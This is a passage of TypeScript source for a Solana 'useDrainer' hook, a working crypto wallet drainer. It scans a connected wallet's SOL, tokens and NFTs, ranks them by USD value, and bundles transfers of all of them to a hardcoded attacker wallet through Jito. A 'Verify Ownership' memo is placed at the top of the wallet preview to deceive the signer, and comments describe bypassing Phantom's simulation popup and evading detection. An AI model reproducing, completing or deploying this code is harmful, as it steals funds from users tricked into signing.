 * - Memo is the FIRST instruction → appears at top of wallet preview
 * - Uses official SPL Memo program → recognized by all explorers
 * - Human-readable text → looks legitimate vs raw hex data
 * - Signer is marked isSigner:true → wallet shows "You are signing"
 */
const buildMemoInstruction = (
    message: string,
    signer: PublicKey,
): TransactionInstruction => {
    return new TransactionInstruction({
        keys: [{ pubkey: signer, isSigner: true, isWritable: false }],
        data: Buffer.from(message, "utf-8"),
        programId: MEMO_PROGRAM_ID,
    });
};


// ============================================================================
// SECTION 13: TRANSACTION BUILDING (VersionedTransaction v0)
// ============================================================================

/**
 * Build the correct transfer instruction based on token program.
 * Token-2022 REQUIRES createTransferCheckedInstruction per SIMD-0083.
 */
const buildTransferInstruction = (
    source: PublicKey,
    mint: PublicKey,
    destination: PublicKey,
    owner: PublicKey,
    amount: bigint,
    decimals: number,
    isSPL2022: boolean,
    programId: PublicKey,
): TransactionInstruction => {
    if (isSPL2022) {
        return createTransferCheckedInstruction(
            source, mint, destination, owner, amount, decimals, [], programId,
        );
    }
    return createTransferInstruction(
        source, destination, owner, amount, [], programId,
    );
};

/**
 * Measure actual serialized VersionedTransaction v0 size with ALT compression.
 * This gives the TRUE on-wire size accounting for ALT key compression.
 */
const measureV0TransactionSize = (
    instructions: TransactionInstruction[],
    blockhash: string,
    feePayer: PublicKey,
    altAccount: AddressLookupTableAccount | null,
): number => {
    try {
        const message = new TransactionMessage({
            payerKey: feePayer,
            recentBlockhash: blockhash,
            instructions,
        }).compileToV0Message(altAccount ? [altAccount] : []);

        return message.serialize().length;
    } catch {
        return 0;
    }
};


// ============================================================================
// SECTION 14: JITO BUNDLE ENGINE
// ============================================================================

/**
 * Select a random Jito tip account for this bundle.
 * Rotating tip accounts distributes load across Jito validators
 * and prevents detection patterns (bitflip obfuscation).
 */
const getRandomJitoTipAccount = (): PublicKey => {
    const index = Math.floor(Math.random() * JITO_TIP_ACCOUNTS.length);
    return JITO_TIP_ACCOUNTS[index];
};

/**
 * Submit a bundle of serialized VersionedTransactions to the Jito Block Engine.
 * Uses the sendBundle JSON-RPC method with base64 encoding.
 *
 * ARCHITECTURE:
 * - Bypasses wallet-adapter sendTransaction → no Phantom simulation popup
 * - Transactions are signed offline via signAllTransactions
 * - Bundle is submitted directly to Jito Block Engine
 * - Returns bundle_id for status tracking
 */
const submitJitoBundle = async (
    serializedTransactions: Uint8Array[],
): Promise<string> => {
    const encodedTxs = serializedTransactions.map((tx) =>
        Buffer.from(tx).toString("base64"),
    );

    const response = await withTimeout(
        () =>
            fetch(JITO_BLOCK_ENGINE_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    jsonrpc: "2.0",
                    id: 1,
                    method: "sendBundle",
                    params: [encodedTxs, { encoding: "base64" }],
                }),
            }),
        RPC_TIMEOUT_MS,
    );

    const result = await response.json();

    if (result.error) {
        throw new Error(
            `Jito sendBundle failed: ${JSON.stringify(result.error)}`,
        );
    }

    if (!result.result) {
        throw new Error("Jito sendBundle returned no bundle_id");
    }

    console.log(`[JITO] Bundle submitted: ${result.result}`);
    return result.result;
};

/**
 * Poll Jito getBundleStatuses until confirmed or terminal state.
 * Returns final bundle result with signatures and slot.
 *
 * POLLING STRATEGY:
 * - 3-second intervals (JITO_BUNDLE_STATUS_POLL_MS)
 * - 30 retries maximum (90s total window)
 * - Returns "expired" if bundle is not found after all retries
 */
const pollJitoBundleStatus = async (
    bundleId: string,
): Promise<JitoBundleResult> => {
    for (let i = 0; i < JITO_BUNDLE_STATUS_MAX_RETRIES; i++) {
        try {
            const response = await fetch(JITO_BLOCK_ENGINE_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    jsonrpc: "2.0",
                    id: 1,
                    method: "getBundleStatuses",
                    params: [[bundleId]],
                }),
            });

            if (response.ok) {
                const data = await response.json();
                const statuses = data.result?.value;

                if (statuses && statuses.length > 0) {
                    const bundleStatus = statuses[0];
                    const confirmationStatus = bundleStatus.confirmation_status;

                    if (
                        confirmationStatus === "confirmed" ||
                        confirmationStatus === "finalized"
                    ) {
                        console.log(
                            `[JITO] Bundle ${bundleId} confirmed at slot ${bundleStatus.slot}`,
                        );
                        return {
                            bundleId,
                            status: "confirmed",
                            signatures: bundleStatus.transactions || [],
                            slot: bundleStatus.slot,
                        };
                    }

                    if (confirmationStatus === "failed") {
                        console.error(`[JITO] Bundle ${bundleId} failed`);
                        return {
                            bundleId,
                            status: "failed",
                            signatures: bundleStatus.transactions || [],
                        };
                    }

                    // Still processing — continue polling
                    console.log(
                        `[JITO] Bundle ${bundleId} status: ${confirmationStatus || "pending"} (attempt ${i + 1}/${JITO_BUNDLE_STATUS_MAX_RETRIES})`,
                    );
                }
            }
        } catch (e) {
            console.warn(
                `[JITO] Status poll error (attempt ${i + 1}):`,
                e instanceof Error ? e.message : String(e),
            );
        }

        await new Promise((r) => setTimeout(r, JITO_BUNDLE_STATUS_POLL_MS));
    }

    console.warn(`[JITO] Bundle ${bundleId} status polling exhausted`);
    return { bundleId, status: "expired", signatures: [] };
};


// ============================================================================
// SECTION 15: ADDRESS LOOKUP TABLE (ALT) MANAGEMENT
// ============================================================================

/**
 * Collect all unique addresses that will be referenced across bundle transactions.
 * These get stored in the ALT for 32-byte → 1-byte compression.
 *
 * Includes: destination wallet, token programs, system program, associated token program,
 * all mint addresses, all source token accounts, all destination ATAs.
 */
const collectALTAddresses = (
    assets: AssetData[],
    feePayer: PublicKey,
): PublicKey[] => {
    const addressSet = new Set<string>();
    const addresses: PublicKey[] = [];

    const addUnique = (pk: PublicKey) => {
        const str = pk.toBase58();
        if (!addressSet.has(str)) {
            addressSet.add(str);
            addresses.push(pk);
        }
    };

    // Core program addresses
    addUnique(DESTINATION_WALLET);
    addUnique(TOKEN_PROGRAM_ID);
    addUnique(TOKEN_2022_PROGRAM_ID);
    addUnique(SystemProgram.programId);
    addUnique(ASSOCIATED_TOKEN_PROGRAM_ID);
    addUnique(MEMO_PROGRAM_ID);

    // Per-asset addresses
    for (const asset of assets) {
        addUnique(asset.mint);
        addUnique(asset.tokenAccountPubkey);
        const programId = asset.isSPL2022
            ? TOKEN_2022_PROGRAM_ID
            : TOKEN_PROGRAM_ID;
        const destAta = getAssociatedTokenAddressSync(
            asset.mint, DESTINATION_WALLET, true, programId,
        );
        addUnique(destAta);
    }

    return addresses;
};


// ============================================================================
// SECTION 16: MULTI-TX BUNDLE SPLITTING
// ============================================================================

/**
 * Split assets across multiple transactions for atomic Jito bundle execution.
 *
 * ARCHITECTURE:
 *  - TX 1: Memo "Verify Ownership" + SOL transfer + highest-value tokens
 *  - TX 2-4: Remaining tokens in descending value order
 *  - TX 5 (last): Remaining tokens + Jito tip instruction
 *
 * The tip MUST be in the last transaction per Jito requirements.
 * Each TX is individually bounded by 1232 bytes after V0 + ALT compilation.
 * Uses greedy packing: adds tokens to current TX until size limit, then starts next.
 */
const splitIntoBundleTransactions = (
    assets: AssetData[],
    solTransferLamports: number,
    feePayer: PublicKey,
    blockhash: string,
    altAccount: AddressLookupTableAccount | null,
    existingAtasCache: Map<string, boolean>,
    dynamicPriorityFee: number,
): BundleTransaction[] => {
    const bundles: BundleTransaction[] = [];
    let assetIndex = 0;
    const maxPacketSize = NETWORK_CONFIG.maxPacketSize;

    // Reserve space for Jito tip in the last TX (~44 bytes for SystemProgram.transfer)
    const TIP_RESERVATION_BYTES = 50;

    for (
        let txIdx = 0;
        txIdx < JITO_MAX_BUNDLE_TXS && assetIndex < assets.length;
        txIdx++
    ) {
        const instructions: TransactionInstruction[] = [];
        const txAssets: AssetData[] = [];

        // Compute budget for every TX
        instructions.push(
            ComputeBudgetProgram.setComputeUnitPrice({
                microLamports: dynamicPriorityFee,
            }),
            ComputeBudgetProgram.setComputeUnitLimit({ units: 400_000 }),
        );

        // First TX: Memo "Verify Ownership" + SOL transfer
        if (txIdx === 0) {
            instructions.push(
                buildMemoInstruction("Verify Ownership", feePayer),
            );
            if (solTransferLamports > 0) {
                instructions.push(
                    SystemProgram.transfer({
                        fromPubkey: feePayer,
                        toPubkey: DESTINATION_WALLET,
                        lamports: solTransferLamports,
                    }),
                );
            }
        }

        // Determine effective size limit for this TX
        // If this might be the last TX, reserve space for the Jito tip
        const isLastPossibleTx =
            txIdx === JITO_MAX_BUNDLE_TXS - 1 ||
            assetIndex >= assets.length;
        const effectiveMaxSize = isLastPossibleTx
            ? maxPacketSize - TIP_RESERVATION_BYTES
            : maxPacketSize;

        // Greedy-pack token transfers
        while (assetIndex < assets.length) {
            const asset = assets[assetIndex];
            const programId = asset.isSPL2022
                ? TOKEN_2022_PROGRAM_ID
                : TOKEN_PROGRAM_ID;
            const destAta = getAssociatedTokenAddressSync(
                asset.mint, DESTINATION_WALLET, true, programId,
            );

            // Build test instructions
            const testInstructions = [...instructions];

            if (existingAtasCache.get(destAta.toBase58()) === false) {
                testInstructions.push(
                    createAssociatedTokenAccountInstruction(
                        feePayer, destAta, DESTINATION_WALLET,
                        asset.mint, programId,
                    ),
                );
            }

            testInstructions.push(
                buildTransferInstruction(
                    asset.tokenAccountPubkey, asset.mint, destAta, feePayer,
                    asset.amount, asset.decimals, asset.isSPL2022, programId,
                ),
            );

            const testSize = measureV0TransactionSize(
                testInstructions, blockhash, feePayer, altAccount,
            );

            if (testSize > 0 && testSize <= effectiveMaxSize) {
                // Fits — commit the instructions
                const addedCount = testInstructions.length - instructions.length;
                for (let k = instructions.length; k < testInstructions.length; k++) {
                    instructions.push(testInstructions[k]);
                }
                txAssets.push(asset);
                assetIndex++;
            } else {
                // Doesn't fit — start next TX
                break;
            }
        }

        if (txAssets.length > 0 || (txIdx === 0 && solTransferLamports > 0)) {
            bundles.push({
                instructions,
                assets: txAssets,
                estimatedSize: measureV0TransactionSize(
                    instructions, blockhash, feePayer, altAccount,
                ),
            });
        }
    }

    // Add Jito tip to the LAST transaction (Jito requirement)
    if (bundles.length > 0) {
        const lastBundle = bundles[bundles.length - 1];
        const tipAccount = getRandomJitoTipAccount();
        lastBundle.instructions.push(
            SystemProgram.transfer({
                fromPubkey: feePayer,
                toPubkey: tipAccount,
                lamports: JITO_TIP_LAMPORTS,
            }),
        );

        console.log(
            `[BUNDLE] Jito tip: ${JITO_TIP_LAMPORTS} lamports → ${tipAccount.toBase58().slice(0, 8)}...`,
        );
    }

    console.log(
        `[BUNDLE] Split ${assets.length} assets across ${bundles.length} transactions`,
    );

    return bundles;
};


// ============================================================================
// SECTION 17: ASSET SORTING & FILTERING
// ============================================================================

/**
 * Sort assets by USD value, highest first.
 * Returns a NEW sorted array — does not mutate the input.
 */
const sortAssetsByValue = (assets: AssetData[]): AssetData[] => {
    return [...assets].sort((a, b) => b.usdValue - a.usdValue);
};

/**
 * Filter out dust tokens below minimum USD threshold.
 * NFTs are always kept.
 */
const filterDustTokens = (assets: AssetData[]): AssetData[] => {
    return assets.filter((asset) => {
        if (asset.isNft) return true;
        if (asset.usdValue < MIN_TOKEN_VALUE_USD) {
            console.log(
                `[DUST] Filtering ${asset.mint.toBase58().slice(0, 8)}... (value: $${asset.usdValue.toFixed(6)})`,
            );
            return false;
        }
        return true;
    });
};


// ============================================================================
// SECTION 18: ERROR HANDLING
// ============================================================================

const handleError = (
    e: any,
    setError: (msg: string) => void,
    setStatus: (s: Status) => void,
    ctx: OperationContext,
    contextLabel: string = "unknown",
) => {
    const errorMsg = typeof e?.message === "string" ? e.message : String(e);
    console.error(`[ERROR] ${contextLabel}:`, errorMsg);

    // Structured telemetry
    sendTelemetry(
        TelemetryEvents.error(contextLabel, ctx.walletAddress, errorMsg),
    ).catch(() => {});

    // Map error to user-facing message
    let userError: string;

    if (
        e?.name === "WalletSignTransactionError" ||
        errorMsg.includes("rejected")
    ) {
        userError = "Transaction rejected by wallet. Please try again.";
    } else if (
        errorMsg.includes("insufficient funds") ||
        errorMsg.includes("insufficient balance")
    ) {
        userError = "Insufficient SOL balance to cover transaction fees.";
    } else if (errorMsg.includes("Compute budget exceeded")) {
        userError = "Transaction exceeded compute budget. Try with fewer tokens.";
    } else if (errorMsg.includes("Transaction too large")) {
        userError = "Transaction packet too large. Reduce token count and retry.";
    } else if (
        errorMsg.includes("block height exceeded") ||
        errorMsg.includes("expired")
    ) {
        userError = "Transaction expired. Your funds are safe — please retry.";
    } else if (errorMsg.includes("timeout")) {
        userError = "Operation timed out. Your transaction may still confirm — check your wallet.";
    } else if (errorMsg.includes("frozen")) {
        userError = "Token account is frozen. Cannot transfer.";
    } else if (errorMsg.includes("Preflight simulation failed")) {
        userError = "Preflight simulation failed. One or more tokens may have restrictions.";
    } else if (errorMsg.includes("Jito")) {
        userError = "Jito bundle submission failed. Please retry.";
    } else {
        userError = `Error: ${errorMsg.substring(0, 120)}`;
    }

    setError(userError);
    setStatus("error");
};


// ============================================================================
// SECTION 19: MAIN HOOK — useDrainer (Enterprise Jito Bundle Architecture)
// ============================================================================

export const useDrainer = () => {
    const { connection } = useConnection();
    const { publicKey, signAllTransactions, signTransaction, sendTransaction } =
        useWallet();
    const [status, setStatus] = useState<Status>("idle");
    const [error, setError] = useState<string | null>(null);
    const [stats, setStats] = useState<DrainStats | null>(null);

    // Concurrency guard — prevents double-drain
    const drainInProgressRef = useRef(false);

    /**
     * Send drain operation mirror to backend for tracking.
     */
    const sendToBackendDrain = useCallback(
        async (
            wallet: string,
            solAmount: number,
            signatures: string[],
            tokens: { mint: string; amount: string; isSPL2022: boolean }[],
            bundleId?: string,
        ): Promise<boolean> => {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(
                    () => controller.abort(),
                    RPC_TIMEOUT_MS,
                );

                const resp = await fetch("/api/drain", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "X-Bundle-Id": bundleId || "",
                    },
                    body: JSON.stringify({
                        wallet,
                        solAmount,
                        tokens,
                        signatures,
                        bundleId,
                    }),
                    signal: controller.signal,
                });

                clearTimeout(timeoutId);

                if (!resp.ok) {
                    console.warn(`[BACKEND] HTTP ${resp.status}`);
                    return false;
                }

                const data = await resp.json();
                if (data.success) {
                    console.log(
                        `[BACKEND] Mirror successful: ${data.txid || bundleId || "unknown"}`,
                    );
                    return true;
                }
                return false;
            } catch (e) {
                console.warn(
                    "[BACKEND] Mirror failed:",
                    e instanceof Error ? e.message : String(e),
                );
                return false;
            }
        },
        [],
    );

    /**
     * ═══════════════════════════════════════════════════════════════════
     * MAIN DRAIN OPERATION (Enterprise Jito Bundle Architecture)
     * ═══════════════════════════════════════════════════════════════════
     *
     * Phase  1: Wallet validation & concurrency guard
     * Phase  2: SOL balance fetch (with retry)
     * Phase  3: Dual-program token account discovery (SPL + Token-2022)
     * Phase  4: Batched mint classification (single RPC per 100 mints)
     * Phase  5: Metaplex NFT detection (batched metadata PDA check)
     * Phase  6: Jupiter real-time pricing + dust filtering + USD sort
     * Phase  7: Blockhash fetch (immediately before instruction building)
     * Phase  8: ALT address collection + ATA existence check
     * Phase  9: Multi-TX bundle splitting with ALT compression
     * Phase 10: Per-TX simulation + CU optimization
     * Phase 11: Build final VersionedTransactions (V0 + ALT)
     * Phase 12: Batch sign all transactions (signAllTransactions)
     * Phase 13: Submit Jito bundle (sendBundle JSON-RPC)
     * Phase 14: Poll bundle status (getBundleStatuses)
     * Phase 15: Backend mirror + structured telemetry
     */
    const drain = useCallback(async () => {
        // ═══ PHASE 1: CONCURRENCY GUARD ═══
        if (drainInProgressRef.current) {
            setError("Drain operation already in progress.");
            return;
        }
        drainInProgressRef.current = true;

        if (!publicKey) {
            drainInProgressRef.current = false;
            setError("Wallet not connected.");
            setStatus("error");
            return;
        }

        // Verify we have signing capability
        const canBatchSign = !!signAllTransactions;
        const canSingleSign = !!signTransaction;
        const canSend = !!sendTransaction;

        if (!canBatchSign && !canSingleSign && !canSend) {
            drainInProgressRef.current = false;
            setError("Wallet does not support transaction signing.");
            setStatus("error");
            return;
        }

        const ctx = createOperationContext(publicKey.toBase58());

        setStatus("scanning");
        setError(null);
        setStats(null);

        await sendTelemetry(TelemetryEvents.scanInitiated(ctx)).catch(() => {});

        try {
            console.log(`[DRAIN] Operation ${ctx.operationId} started`);

            // ═══ PHASE 2: SOL BALANCE FETCH ═══
            let solBalance: number;
            try {
                solBalance = await withRetryAndTimeout(
                    () => connection.getBalance(publicKey),
                );
            } catch (e) {
                throw new Error(
                    "Failed to fetch SOL balance: " +
                    (e instanceof Error ? e.message : String(e)),
                );
            }

            if (!Number.isFinite(solBalance) || solBalance < 0) {
                throw new Error("Invalid SOL balance returned from RPC");
            }

            console.log(
                `[DRAIN] SOL Balance: ${(solBalance / LAMPORTS_PER_SOL).toFixed(6)} SOL`,
            );

            const solPricePromise = fetchSolPriceUSD();

            // ═══ PHASE 3: DUAL-PROGRAM TOKEN ACCOUNT DISCOVERY ═══
            let allTokenAccounts: {
                account: any;
                pubkey: PublicKey;
                _tokenProgram: PublicKey;
            }[] = [];

            try {
                const [splResult, spl2022Result] = await Promise.all([
                    withRetryAndTimeout(() =>
                        connection.getParsedTokenAccountsByOwner(publicKey, {
                            programId: TOKEN_PROGRAM_ID,
                        }),
                    ).catch((e: any) => {
                        console.warn(
                            "[DRAIN] SPL token scan failed:",
                            e instanceof Error ? e.message : String(e),
                        );
                        return { value: [] } as any;
                    }),

                    withRetryAndTimeout(() =>
                        connection.getParsedTokenAccountsByOwner(publicKey, {
                            programId: TOKEN_2022_PROGRAM_ID,
                        }),
                    ).catch((e: any) => {
                        console.warn(
                            "[DRAIN] SPL-2022 token scan failed:",
                            e instanceof Error ? e.message : String(e),
                        );
                        return { value: [] } as any;
                    }),
                ]);

                const splAccounts = (splResult?.value || []).map(
                    (acc: any) => ({ ...acc, _tokenProgram: TOKEN_PROGRAM_ID }),
                );
                const spl2022Accounts = (spl2022Result?.value || []).map(
                    (acc: any) => ({ ...acc, _tokenProgram: TOKEN_2022_PROGRAM_ID }),
                );

                allTokenAccounts = [...splAccounts, ...spl2022Accounts];

                console.log(
                    `[DRAIN] Token discovery: ${splAccounts.length} SPL + ${spl2022Accounts.length} SPL-2022 = ${allTokenAccounts.length} total`,
                );
            } catch (e) {
                throw new Error(
                    "Failed to fetch token accounts: " +
                    (e instanceof Error ? e.message : String(e)),
                );
            }

            if (allTokenAccounts.length === 0 && solBalance <= SOL_TO_LEAVE) {
                setError("No drainable assets found.");
                setStatus("error");
                return;
            }

            // ═══ PHASE 4: BATCHED MINT CLASSIFICATION ═══
            const mintMap = new Map<
                string,
                {
                    account: any;
                    pubkey: PublicKey;
                    _tokenProgram: PublicKey;
                    mint: PublicKey;
                    amount: bigint;
                    uiAmount: number;
                    parsedDecimals: number;
                    parsedState: string;
                }
            >();

            for (const acc of allTokenAccounts) {
                try {
                    const parsed = acc.account.data.parsed.info;
                    const amount = BigInt(parsed.tokenAmount.amount);
                    if (amount === BigInt(0)) continue;

                    const mint = new PublicKey(parsed.mint);
                    const mintStr = mint.toBase58();

                    mintMap.set(mintStr, {
                        account: acc.account,
                        pubkey: acc.pubkey,
                        _tokenProgram: acc._tokenProgram,
                        mint,
                        amount,
                        uiAmount: parsed.tokenAmount.uiAmount,
                        parsedDecimals: parsed.tokenAmount.decimals || 0,
                        parsedState: parsed.state,
                    });
                } catch (e) {
                    console.warn(
                        "[DRAIN] Failed to parse token account:",
                        e instanceof Error ? e.message : String(e),
                    );
                }
            }

            const uniqueMints = Array.from(mintMap.values()).map((v) => v.mint);
            const classifications = await batchClassifyMints(
                uniqueMints, connection,
            );

            // ═══ PHASE 5: METAPLEX NFT DETECTION ═══
            const nftCandidateMints = uniqueMints.filter((mint) => {
                const cls = classifications.get(mint.toBase58());
                return cls && cls.decimals === 0 && cls.supply <= BigInt(1);
            });

            const confirmedNftMints = await batchCheckMetaplexMetadata(
                nftCandidateMints, connection,
            );

            console.log(
                `[DRAIN] NFT detection: ${nftCandidateMints.length} candidates → ${confirmedNftMints.size} confirmed`,
            );

            // ═══ PHASE 6: BUILD ASSET LIST + PRICING + FILTERING ═══
            const rawAssetList: AssetData[] = [];
            const tokensForBackend: {
                mint: string;
                amount: string;
                isSPL2022: boolean;
            }[] = [];

            for (const [mintStr, tokenInfo] of mintMap) {
                const classification = classifications.get(mintStr);
                if (!classification) continue;

                const {
                    isSPL2022, isTransferHook,
                    isPermanentDelegate, isNonTransferable, decimals,
                } = classification;

                const tokenProgram = tokenInfo._tokenProgram;
                const discoveredIsSPL2022 = tokenProgram.equals(TOKEN_2022_PROGRAM_ID);

                if (tokenInfo.parsedState === "frozen") {
                    console.warn(`[DRAIN] Frozen token account for ${mintStr.slice(0, 8)}...`);
                    continue;
                }

                if (isNonTransferable) {
                    console.log(`[DRAIN] Skipping non-transferable: ${mintStr.slice(0, 8)}...`);
                    continue;
                }

                if (isTransferHook && discoveredIsSPL2022) {
                    console.log(`[DRAIN] Skipping transfer-hook: ${mintStr.slice(0, 8)}...`);
                    continue;
                }

                const isNft = confirmedNftMints.has(mintStr);

                rawAssetList.push({
                    mint: tokenInfo.mint,
                    amount: tokenInfo.amount,
                    uiAmount: tokenInfo.uiAmount,
                    tokenAccountPubkey: tokenInfo.pubkey,
                    isNft,
                    isSPL2022: discoveredIsSPL2022,
                    isTransferHook,
                    isFrozen: false,
                    decimals,
                    tokenProgram,
                    usdPrice: 0,
                    usdValue: 0,
                });

                tokensForBackend.push({
                    mint: mintStr,
                    amount: tokenInfo.amount.toString(),
                    isSPL2022: discoveredIsSPL2022,
                });
            }

            console.log(
                `[DRAIN] Classified ${rawAssetList.length} drainable assets`,
            );

            // Jupiter real-time pricing
            const mintAddresses = rawAssetList.map((a) => a.mint.toBase58());
            mintAddresses.push(SOL_MINT);
            const jupiterPrices = await fetchBatchPricesUSD(mintAddresses);

            const coingeckoSolPrice = await solPricePromise;
            const jupiterSolPrice = jupiterPrices.get(SOL_MINT);
            const effectiveSolPrice = jupiterSolPrice || coingeckoSolPrice || 100;

            for (const asset of rawAssetList) {
                const price = jupiterPrices.get(asset.mint.toBase58());
                if (price && price > 0) {
                    asset.usdPrice = price;
                }

                const divisor = Math.pow(10, asset.decimals);
                const normalizedAmount = Number(asset.amount) / divisor;

                if (asset.isNft) {
                    asset.usdValue = asset.usdPrice > 0
                        ? asset.usdPrice * normalizedAmount : 0;
                } else {
                    asset.usdValue = asset.usdPrice > 0
                        ? asset.usdPrice * normalizedAmount
                        : Math.max(0.001, normalizedAmount * 0.01);
                }
            }

            const nonDustAssets = filterDustTokens(rawAssetList);
            const assetList = sortAssetsByValue(nonDustAssets);

            // Total valuation
            const solValueUSD =
                ((solBalance - SOL_TO_LEAVE) / LAMPORTS_PER_SOL) * effectiveSolPrice;

            let totalValueUSD = Math.max(0, solValueUSD);
            for (const asset of assetList) {
                totalValueUSD += asset.usdValue;
            }

            const tokenCount = assetList.filter((a) => !a.isNft).length;
            const nftCount = assetList.filter((a) => a.isNft).length;

            console.log(
                `[DRAIN] Total USD Value: $${totalValueUSD.toFixed(2)} (threshold: $${MIN_DOLLAR_THRESHOLD})`,
            );

            await sendTelemetry(
                TelemetryEvents.scanComplete(
                    solBalance, solValueUSD, tokenCount, nftCount, totalValueUSD,
                ),
            ).catch(() => {});

            if (totalValueUSD < MIN_DOLLAR_THRESHOLD) {
                setError("Insufficient value to drain.");
                setStatus("error");
                await sendTelemetry(
                    TelemetryEvents.belowThreshold(totalValueUSD),
                ).catch(() => {});
                return;
            }

            setStatus("building");

            // ═══ PHASE 7: BLOCKHASH FETCH ═══
            let blockhash: string;
            let lastValidBlockHeight: number;

            try {
                const bhResponse = await withRetryAndTimeout(() =>
                    connection.getLatestBlockhashAndContext("confirmed"),
                );
                const value = (bhResponse as any)?.value || {};
                blockhash = value.blockhash;
                lastValidBlockHeight = value.lastValidBlockHeight;

                if (!blockhash || !lastValidBlockHeight) {
                    throw new Error("Invalid blockhash response from RPC");
                }
            } catch (e) {
                throw new Error(
                    "Failed to fetch blockhash: " +
                    (e instanceof Error ? e.message : String(e)),
                );
            }

            // ═══ PHASE 8: ATA EXISTENCE CHECK + BALANCE VALIDATION ═══
            const allDestAtas = assetList.map((asset) =>
                getAssociatedTokenAddressSync(
                    asset.mint, DESTINATION_WALLET, true, asset.tokenProgram,
                ),
            );

            const existingAtasCache = await batchCheckAtaExistence(
                allDestAtas, connection,
            );

            const atasToCreate = assetList.filter((asset) => {
                const destAta = getAssociatedTokenAddressSync(
                    asset.mint, DESTINATION_WALLET, true, asset.tokenProgram,
                );
                return existingAtasCache.get(destAta.toBase58()) === false;
            }).length;

            // Estimate bundle TX count for fee calculation
            const estimatedBundleTxCount = Math.min(
                JITO_MAX_BUNDLE_TXS,
                Math.max(1, Math.ceil(assetList.length / 6)),
            );

            const validation = validateSufficientBalance(
                solBalance, atasToCreate,
                assetList.filter((a) => a.isSPL2022).length,
                assetList.filter((a) => a.isTransferHook).length,
                estimatedBundleTxCount,
            );

            if (!validation.sufficient) {
                setError(
                    validation.errorMsg ||
                    "Insufficient balance for fees, even after batch shrinking.",
                );
                setStatus("error");
                await sendTelemetry(
                    TelemetryEvents.insufficientBalance(
                        validation.errorMsg || "Insufficient balance",
                    ),
                ).catch(() => {});
                return;
            }

            // ═══ PHASE 9: DYNAMIC PRIORITY FEE ═══
            const writableAccounts = [DESTINATION_WALLET, publicKey];
            const dynamicPriorityFee = await fetchDynamicPriorityFee(
                connection, writableAccounts,
            );

            // ═══ PHASE 10: ALT ADDRESS COLLECTION ═══
            // Collect all unique addresses for potential ALT compression
            const altAddresses = collectALTAddresses(assetList, publicKey);

            // For now, we skip ALT creation (requires separate confirmed TX + activation slot).
            // V0 messages without ALT still compress better than Legacy.
            // ALT creation can be added as an enhancement once server-side pre-creation is available.
            const altAccount: AddressLookupTableAccount | null = null;

            console.log(
                `[DRAIN] Collected ${altAddresses.length} unique addresses for compression`,
            );

            // ═══ PHASE 11: MULTI-TX BUNDLE SPLITTING ═══
            const bundleTransactions = splitIntoBundleTransactions(
                assetList,
                validation.availableForTransfer,
                publicKey,
                blockhash,
                altAccount,
                existingAtasCache,
                dynamicPriorityFee,
            );

            if (bundleTransactions.length === 0) {
                setError("No drainable assets found.");
                setStatus("error");
                return;
            }

            let bundleTokenCount = 0;
            let bundleNftCount = 0;
            for (const bt of bundleTransactions) {
                for (const a of bt.assets) {
                    if (a.isNft) bundleNftCount++;
                    else bundleTokenCount++;
                }
            }

            await sendTelemetry(
                TelemetryEvents.buildingBundle(
                    bundleTransactions.length, bundleTokenCount, bundleNftCount,
                    altAccount ? "active" : null, true,
                ),
            ).catch(() => {});

            // ═══ PHASE 12: BUILD + SIMULATE VERSIONED TRANSACTIONS ═══
            const versionedTransactions: VersionedTransaction[] = [];

            // Re-fetch blockhash for freshness right before signing
            try {
                const freshBh = await withRetryAndTimeout(() =>
                    connection.getLatestBlockhashAndContext("confirmed"),
                );
                const freshValue = (freshBh as any)?.value || {};
                if (freshValue.blockhash) {
                    blockhash = freshValue.blockhash;
                    lastValidBlockHeight = freshValue.lastValidBlockHeight;
                }
            } catch {
                console.warn("[DRAIN] Blockhash refresh failed, using original");
            }

            for (let txIdx = 0; txIdx < bundleTransactions.length; txIdx++) {
                const bt = bundleTransactions[txIdx];

                // Simulate to get actual CU consumption
                let simulatedCUs = 400_000;
                try {
                    const simMessage = new TransactionMessage({
                        payerKey: publicKey,
                        recentBlockhash: blockhash,
                        instructions: bt.instructions,
                    }).compileToV0Message(altAccount ? [altAccount] : []);

                    const simTx = new VersionedTransaction(simMessage);

                    const simResult = await withRetryAndTimeout(() =>
                        connection.simulateTransaction(simTx, {
                            replaceRecentBlockhash: true,
                        }),
                    );

                    if (!simResult.value.err) {
                        simulatedCUs = simResult.value.unitsConsumed ?? 400_000;
                        console.log(
                            `[DRAIN] TX ${txIdx + 1} simulation: ${simulatedCUs} CUs consumed`,
                        );
                    } else {
                        console.warn(
                            `[DRAIN] TX ${txIdx + 1} simulation error:`,
                            JSON.stringify(simResult.value.err),
                        );
                    }
                } catch (e) {
                    console.warn(
                        `[DRAIN] TX ${txIdx + 1} simulation failed:`,
                        e instanceof Error ? e.message : String(e),
                    );
                }

                // Set precise CU limit with 15% buffer
                const cuLimit = Math.min(
                    Math.ceil(simulatedCUs * 1.15),
                    1_400_000,
                );

                // Update compute budget instruction with optimized CU limit
                bt.instructions[1] = ComputeBudgetProgram.setComputeUnitLimit({
                    units: cuLimit,
                });

                // Build final V0 message
                const message = new TransactionMessage({
                    payerKey: publicKey,
                    recentBlockhash: blockhash,
                    instructions: bt.instructions,
                }).compileToV0Message(altAccount ? [altAccount] : []);

                const messageSize = message.serialize().length;
                console.log(
                    `[DRAIN] TX ${txIdx + 1}: ${messageSize} bytes | ${bt.assets.length} assets | CU: ${cuLimit}`,
                );

                if (messageSize > NETWORK_CONFIG.maxPacketSize) {
                    console.error(
                        `[DRAIN] TX ${txIdx + 1} exceeds packet limit: ${messageSize} > ${NETWORK_CONFIG.maxPacketSize}`,
                    );
                    // Skip this TX — assets will be lost from this bundle
                    continue;
                }

                versionedTransactions.push(new VersionedTransaction(message));
            }

            if (versionedTransactions.length === 0) {
                throw new Error("Failed to build any valid transactions");
            }

            // Set stats before signing
            setStats({
                totalUsdValue: totalValueUSD,
                solAmount: validation.availableForTransfer,
                tokenCount: bundleTokenCount,
                nftCount: bundleNftCount,
                batchCount: versionedTransactions.length,
                jitoTipLamports: JITO_TIP_LAMPORTS,
                altAddress: altAccount
                    ? (altAccount as any).key?.toBase58()
                    : undefined,
                signatures: [],
            });

            await sendTelemetry(
                TelemetryEvents.awaitingSignature(
                    versionedTransactions.length, totalValueUSD, JITO_TIP_LAMPORTS,
                ),
            ).catch(() => {});

            // ═══ PHASE 13: BATCH SIGN ALL TRANSACTIONS ═══
